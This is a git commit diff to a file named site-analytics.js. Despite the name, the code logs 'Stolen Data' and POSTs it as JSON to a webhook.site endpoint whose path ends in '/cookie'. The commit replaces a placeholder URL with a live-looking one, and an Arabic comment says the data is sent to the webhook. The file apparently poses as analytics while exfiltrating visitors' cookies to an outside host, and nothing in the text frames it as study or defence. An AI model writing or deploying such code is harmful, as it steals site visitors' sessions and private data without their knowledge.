b4b1bca528e5924239820e714dde3ba260cc7ec5
zaid111A <55982555+zaid111A@users.noreply.github.com>
2025-05-05 22:00:34 +0300

    Update 1 site-analytics.js

--- site-analytics.js
+++ site-analytics.js
@@ -11,8 +11,12 @@
 
   console.log("🔥 Stolen Data:", data);
 
-  fetch("https://webhook.site/xxxxxx", {
+  // إرسال البيانات إلى Webhook
+  fetch("https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/cookie", {
     method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
     body: JSON.stringify(data)
   });
 })();
